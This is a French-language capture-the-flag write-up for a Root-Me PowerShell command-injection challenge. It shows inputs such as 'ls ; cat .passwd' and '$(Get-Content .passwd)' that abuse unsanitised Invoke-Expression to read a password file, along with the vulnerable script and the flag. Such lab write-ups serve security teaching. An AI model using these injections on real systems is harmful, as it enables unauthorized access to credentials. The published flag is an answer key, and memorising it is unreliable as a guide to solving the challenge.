## Source et énoncé du CTF

<https://www.root-me.org/fr/Challenges/App-Script/Powershell-Command-injection>

## Write-up

Après la connexion au challenge, la sortie suivante s'affiche :
```bash
Table to dump:
> 
```
Cette sortie laisse penser qu'on se connecte à une base de données et qu'il va falloir faire des requêtes SQL pour pouvoir obtenir le flag. Mais le titre du challenge évoque plutôt une injection Powershell et "IEX" qui fait référence à la fonction Powershell "Invoke-Expression" servant à évaluer ou exécuter une chaîne spécifiée en tant que commande et retourner les résultats de l’expression ou de la commande. On note cependant que la fonction "Invoke-Expression" n'effectue aucun traitement sur les expressions invoquées.
 :
<https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.6>

Il va donc probablement falloir exploiter une mauvaise utilisation de cette fonction pour injecter des commandes sur le serveur et afficher le flag du challenge. On peut notamment faire l'hypothèse que toutes les précautions concernant l'usage sécurisé de cette fonction n'ont pas été prises. 

La première étape serait d'essayer d'injecter une commande permettant d'afficher le contenu du répertoire courant :
```bash
Table to dump:
> ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AE4ASQBKADYAdAB1AG0ASgBZADcASwB6AEQARgBVAFIAaQBTACsASAArAHcAPQA9AHwAZgAwAGMAMQAyAGEAZQBiADYAYwA0AGIAZQBkADYANwA
1ADEAYgA0AGEAMQBmAGIAMgA1ADMAOQA4ADgANAAzADUAZAAwADYAYwA1ADUAMQA2ADcAMgBmADkANwBjAGYANgA4ADQANgBkADIANABkAGQAOQAyADkAMgA2ADkAMgBlADEAMwBmAGYAOQA5AGQAMQAzADgAYQBkADQAMwA3ADQAZgA5ADcAOQA2AGIANwA5ADIA
MQA4AGIAZAA4AGMA. Backup the table ls
Table to dump:
>
```
Sans succès : la commande n'est pas injectée.

La seconde étape peut être d'essayer d'ajouter un séparateur de commande (;) pour echapper une seconde commande qu'on essayerait d'injecter :
```bash
> ls; ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AE4ASQBKADYAdAB1AG0ASgBZADcASwB6AEQARgBVAFIAaQBTACsASAArAHcAPQA9AHwAZgAwAGMAMQAyAGEAZQBiADYAYwA0AGIAZQBkADYANwA
1ADEAYgA0AGEAMQBmAGIAMgA1ADMAOQA4ADgANAAzADUAZAAwADYAYwA1ADUAMQA2ADcAMgBmADkANwBjAGYANgA4ADQANgBkADIANABkAGQAOQAyADkAMgA2ADkAMgBlADEAMwBmAGYAOQA5AGQAMQAzADgAYQBkADQAMwA3ADQAZgA5ADcAOQA2AGIANwA5ADIA
MQA4AGIAZAA4AGMA. Backup the table ls


    Directory: C:\cygwin64\challenge\app-script\ch18


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       11/21/2021  11:34 AM            150 .key
-a----        4/20/2020  10:50 AM             18 .passwd
------       12/12/2021   9:50 AM            574 ._perms
------       11/21/2021  11:35 AM            348 ch18.ps1
Table to dump:
>
```
Cela permet d'afficher le contenu du répertoire courant.

On peut faire de même pour essayer d'afficher le contenu du fichier *.passwd* et obtenir le flag :
```bash
Table to dump:
> ls ; cat .passwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AE4ASQBKADYAdAB1AG0ASgBZADcASwB6AEQARgBVAFIAaQBTACsASAArAHcAPQA9AHwAZgAwAGMAMQAyAGEAZQBiADYAYwA0AGIAZQBkADYANwA
1ADEAYgA0AGEAMQBmAGIAMgA1ADMAOQA4ADgANAAzADUAZAAwADYAYwA1ADUAMQA2ADcAMgBmADkANwBjAGYANgA4ADQANgBkADIANABkAGQAOQAyADkAMgA2ADkAMgBlADEAMwBmAGYAOQA5AGQAMQAzADgAYQBkADQAMwA3ADQAZgA5ADcAOQA2AGIANwA5ADIA
MQA4AGIAZAA4AGMA. Backup the table ls
SecureIEXpassword
Table to dump:
>
```

On peut enfin confirmer nos hypothèses en affichant le contenu du script Powershell servant de base au chalmlenge :
```bash
Table to dump:
> ls ; cat ch18.ps1
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AE4ASQBKADYAdAB1AG0ASgBZADcASwB6AEQARgBVAFIAaQBTACsASAArAHcAPQA9AHwAZgAwAGMAMQAyAGEAZQBiADYAYwA0AGIAZQBkADYANwA
1ADEAYgA0AGEAMQBmAGIAMgA1ADMAOQA4ADgANAAzADUAZAAwADYAYwA1ADUAMQA2ADcAMgBmADkANwBjAGYANgA4ADQANgBkADIANABkAGQAOQAyADkAMgA2ADkAMgBlADEAMwBmAGYAOQA5AGQAMQAzADgAYQBkADQAMwA3ADQAZgA5ADcAOQA2AGIANwA5ADIA
MQA4AGIAZAA4AGMA. Backup the table ls
$key = Get-Content .key
$SecurePassword = Get-Content .passwd | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -key $key

while($true) {
        Write-Host "Table to dump: "
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"
}
Table to dump:
>
```
On note effectivement que la fonction "iex" prend comme argument une chaine de caractères contenant la variable *$table*, et que cette variable contient le résultat retourné par l'instruction *Read-Host* sans post-traitements. En clair, tout ce qui va être entré par l'utilisateur sur la ligne de commande après le ";" (fin d'instruction) va être exécuté par le serveur comme un commande Powershell et non pas comme une chaine de texte à afficher.

Une autre solution aurait pu être :
```bash
> $(Get-Content .passwd)
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AHAAcgBHAEUAcwBzAFMAQQBJAFcAQQAvAE0AUwByADEAdwBUAGsAeQBjAGcAPQA9AHwAZAA2ADcAOAA0ADIAMgBiADcANgBkADMAMgAyAGYAYgA
3AGYAOAA2ADQANQBhADQAOQBmAGEAYQBiADAANQA4AGQAYQA3AGYAZABlADUANgAzADgANAAzADIANgBlADUANwAyAGMAZABhADIAZQA4AGMAOQA4AGQAZgA3AGYAZQAyADQAMAA1AGUAYQAxADcAMAA0ADIAMQA5ADgAMQBkAGMAZgA1ADgANwA4ADgAZQA4AGMA
NQA4AGYAZABmADgA. Backup the table SecureIEXpassword
Table to dump:
>
```
Ici, le mécanisme est différent (insertion) : "$(Get-Content .passwd)" est stocké tel quel dans *$table*. Ce n'est que lorsque "iex" parse la chaîne complète (construite par interpolation) comme du code PowerShell que l'opérateur de sous-expression $(...) est évalué : *Get-Content .passwd* est alors exécuté et son résultat est inséré dans la commande Write-Host finale, qui l'affiche à l'écran.


## Flag

SecureIEXpassword